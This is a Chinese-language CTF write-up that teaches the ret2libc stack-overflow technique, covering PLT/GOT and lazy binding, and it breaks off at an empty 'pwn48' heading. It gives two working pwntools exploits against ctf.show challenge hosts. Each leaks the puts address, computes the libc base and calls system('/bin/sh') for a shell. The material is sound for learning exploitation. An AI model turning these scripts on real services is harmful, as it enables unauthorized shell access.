## ctf pwn ret2libc

### 1.ret2libc的了解

本文件主要是对ret2libc类的一个基本栈溢出的问题进行一个解释，如果想要实现ret2libc那就要实现一下几点

```tex
1.存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。

2.存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻找libc的基地址。
```

同时丢眼这类题的保护也有着一些特点，因此当看到保护时也可以想到ret2libc的文件进行攻击方法如下：

```tex
1.开启了NX保护，即数据段不可执行。同时栈也是不可执行的。因此就别想通过写入shellcode再ret2shellcode这样的方法拿shell。

2.程序本身也没有像system("/bin/sh")这样直接的后门函数，因此我们也不要想着直接ret2text这么直接。

3.程序中可能既没有system函数，又没有"/bin/sh"字符串，需要我们在libc库中寻找。
```



![image-20241114215146657](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241114215146657.png)

### 2.解题思路

这里我们要明确自己的目标是要拿到shell执行权限，因此要让二进制文件可以执行流程，让程序可以执行system('/bin/sh')。因此可以分为两步:
```
1.找到system()函数和’/bin/sh'字符串在libc中的地址
2.劫持程序的执行流程，让程序执行system(‘/bin/sh’)
```

而这里主要难的是一个找到libc中的地址因此我们这里要了解一个公式：

```
函数的真实地址=基地址+偏移地址
```

#### 前置知识

#### plt表和got表

这个里可以不用了解的特别深入

主要点是连接上面一点是这个二进制文件本身是没有写入system函数的同样也没有/bin/sh的字符串但是这里就要看libc文件了，而libc文件时一个集成了很多函数的一个库（但是并不是一个库这里只是一个类似而已），因此这个文件中就会存在system函数和我们需要的字符串，因此我们需要在libc中找到我们需要函数的地址，获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址。为什么是已经执行过的函数的地址呢，此处就要介绍plt表和got表的内容了。

got表：这个是可以获得一个外部函数在内存的确切地址的表，同时当有外部函数访问时也就是访问这个表来得到这个函数的具体地址同时我们可以用这个表和libc的基地址可以获得system的真实地址

plt表：procedure link table 程序链接表，位于代码段，是一个每个条目是16字节内容的数组，使得代码能够方便的访问共享的函数或者变量。可以理解为函数的入口地址，通过劫持返回地址为puts函数的plt表地址，即可执行puts函数。

同样这里也要引入一个延迟绑定机制

#### 延迟绑定

只有动态库libc中的函数在被调用时，才会进行地址解析和重定位工作，也就是说，只有函数发生调用之后，上图中最右侧的两个箭头才建立完成，我们才能够通过got表读取到libc中的函数。至于具体过程相对复杂，这里引用大佬博主的图片简要介绍，当程序第一次执行某个函数A时，发生的过程如下：

![image-20241114222414153](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241114222414153.png)

  在可执行二进制程序调用函数A时，会先找到函数A对应的PLT表，PLT表中第一行指令则是找到函数A对应的GOT表。此时由于是程序第一次调用A，GOT表还未更新（就是图一中最右边俩箭头还没有建立），会先去公共PLT进行一番操作查找函数A的位置，找到A的位置后再更新A的GOT表，并调用函数A。当第二次执行函数A时，发生的流程就很简单了，如下图：

![image-20241114222422713](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241114222422713.png) 

  此时A的GOT表已经更新，可以直接在GOT表中找到其在内存中的位置并直接调用。说白了，图三就是图一。 

---

#### 例题：

##### pwn45

题目中提示了这里面没有明显的system函数也没有/bin/sh字符串但是这个可以在libc文件中获取因此我们可以使用ret2libc来使用

![image-20241117142626508](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241117142626508.png)

![image-20241117142644365](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241117142644365.png)

在ctfshow函数中发现了一个栈溢出因此他的偏移量位0x6b+4因此他的exp：

```
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28183)
elf = ELF('/home/fofa/pwn')
main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload = cyclic(0x6b+4) + p32(puts_plt)+p32(main)+p32(puts_got)
io.recvuntil("O.o?")
io.sendline(payload)
puts_addr= u32(io.recvuntil(b'\xf7')[-4:])
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system = libc_base+libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
payload = cyclic(0x6b+4) + p32(system)+p32(main)+p32(binsh)

io.sendline(payload)
io.interactive()
```

---

##### pwn47

这个题是一个比较简单的libc同时puts的文件也不需要我们寻找只用识别和读取就可以了

![image-20241117173932096](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241117173932096.png)

![image-20241117174005694](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241117174005694.png)

运行发现了他输出我所需要的puts和read的地址值

因此我们的exp：

```python
from pwn import*
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
# io = process('/home/fofa/pwn')
io = remote('pwn.challenge.ctf.show',28258)
elf = ELF('/home/fofa/pwn')

io.recvuntil(b"puts: ")
puts = eval(io.recvuntil("\n" , drop = True))
io.recvuntil(b"gift: ")
bin_sh = eval(io.recvuntil("\n" , drop = True))
libc = LibcSearcher("puts" , puts)
libc_base = puts - libc.dump("puts")
system = libc_base + libc.dump("system")
paylad = b"a"*(0x9c+4) + p32(system) + p32(0) + p32(bin_sh)
io.sendline(paylad)
io.interactive()
```

---

##### pwn48
